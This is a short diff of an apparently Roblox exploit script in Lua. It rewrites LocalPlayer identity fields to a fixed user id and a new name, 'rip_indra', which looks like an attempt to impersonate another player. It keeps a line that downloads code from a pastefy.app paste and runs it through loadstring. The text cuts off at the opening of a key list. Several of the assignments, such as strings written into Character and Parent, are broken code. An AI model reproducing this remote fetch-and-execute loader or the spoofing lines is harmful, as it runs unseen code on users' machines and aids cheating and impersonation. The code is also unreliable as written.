@@ -1,9 +1,5 @@
 game.Players.LocalPlayer.UserId = "3095250"
-game.Players.LocalPlayer.DisplayName = "3095250"
-game.Players.LocalPlayer.PlayerId = "3095250"
-game.Players.LocalPlayer.Name = "3095250"
-game.Players.LocalPlayer.Character = "3095250"
-game.Players.LocalPlayer.Parent = "3095250"
+game.Players.LocalPlayer.Name = "rip_indra"
 loadstring(game:HttpGet("https://pastefy.app/nTehfRWs/raw"))()
 
 local keylist = {
